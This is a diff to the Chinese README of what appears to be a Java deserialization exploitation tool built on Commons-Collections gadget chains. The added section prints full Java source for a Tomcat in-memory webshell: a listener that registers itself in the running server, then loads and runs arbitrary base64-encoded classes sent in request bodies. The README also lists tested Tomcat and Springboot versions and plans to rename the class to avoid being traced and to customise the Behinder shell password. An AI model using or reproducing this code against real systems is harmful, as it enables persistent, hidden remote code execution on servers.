@@ -37,6 +37,47 @@ Commons-CollectionsK1_1 和K1的区别基本上只是我用的是InstantiateTran
 
 另外我这边同一个listener同时实现命令执行回显和内存马,命令执行回显可以GBK编码
 
+核心利用链为实现一个Listener同时继承AbstractTranslet类并且实现ServletRequestListener接口
+
+```JAVA
+public class Init extends AbstractTranslet implements ServletRequestListener  {
+    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException { }
+    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException { }
+    public Init() throws Exception {
+        super();
+        super.namesArray = new String[]{"ccdr4gon"};
+        WebappClassLoaderBase webappClassLoaderBase =(WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
+        StandardContext standardCtx = (StandardContext)webappClassLoaderBase.getResources().getContext();
+        standardCtx.addApplicationEventListener(this);
+    }
+
+    @Override
+    public void requestDestroyed(ServletRequestEvent sre) {}
+    @Override
+    public void requestInitialized(ServletRequestEvent sre) {
+        try {
+            RequestFacade requestfacade= (RequestFacade) sre.getServletRequest();
+            Field field = requestfacade.getClass().getDeclaredField("request");
+            field.setAccessible(true);
+            Request request = (Request) field.get(requestfacade);
+            if (request.getParameter("stage").equals("init")) {
+                StringBuilder sb = new StringBuilder("");
+                BufferedReader br = request.getReader();
+                String str;
+                while ((str = br.readLine()) != null) {
+                    sb.append(str);
+                }
+                byte[] payload = Base64.getDecoder().decode(sb.toString());
+                Method defineClass = Class.forName("java.lang.ClassLoader").getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
+                defineClass.setAccessible(true);
+                Class clazz = (Class) defineClass.invoke(Thread.currentThread().getContextClassLoader(), payload, 0, payload.length);
+                clazz.newInstance();
+            }
+        }catch (Exception ignored){ }
+    }
+}
+```
+
 ### 本地测试过的中间件版本
 
 Tomcat 8.5.51 √
@@ -45,7 +86,7 @@ Springboot 2.3.5 √  似乎对应 tomcat-embed-core 9.0.39
 
 # 未来准备更新(可能)
 
-- 把类名改了,总感觉会有0.1%的可能性会被溯源
+- 把类名改了,总感觉有可能会被溯源
 - shiro
   - 自定义Behinder的pass(现在还只能是默认的rebeyond,太惨了)
   - aes gcm加密方式(说实话也不知道有没有用)
